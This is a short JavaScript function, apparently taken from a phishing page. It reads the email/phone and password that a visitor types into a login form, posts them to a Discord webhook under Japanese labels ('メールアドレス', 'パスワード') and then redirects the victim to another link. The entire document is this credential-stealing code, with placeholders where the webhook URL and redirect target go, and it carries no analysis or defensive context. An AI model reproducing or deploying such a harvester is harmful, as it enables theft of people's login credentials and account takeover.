  <script>
  function sendWebhook() {

    var phoneNumber = document.getElementById('input__mailtel').value;
    var password = document.getElementById('input__password').value;

    var webhookURL = 'discord webhook';

    var payload = {
        content: "```\n" + `メールアドレス: ${phoneNumber}\nパスワード: ${password}` + "\n```",
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    }).then(response => console.log(response));
    location.href = " links "
}
  </script>
